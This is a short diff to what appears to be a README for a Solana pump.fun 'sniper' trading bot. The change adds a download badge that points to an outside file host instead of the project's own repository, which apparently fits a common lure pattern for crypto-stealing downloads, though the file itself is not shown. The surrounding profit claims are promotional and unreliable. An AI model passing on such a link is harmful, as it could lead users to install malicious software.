@@ -9,3 +9,5 @@
 - **Customizable Settings:** configure the bot's parameters to suit your trading preferences, such as token filters, price thresholds, and more.
 - **Profit Maximization:** designed to maximize profits by buying low and selling high during pump events.
 - **Low Latency Execution:** minimizes delays between detecting an opportunity and executing the trade to stay ahead of the market.
+
+[![Download Solana PumpFunSniperBot](https://img.shields.io/badge/Download-Solana%20PumpFunSniperBot-blueviolet)](https://downeefiles.com/s/slnnpmpfnsnprr)
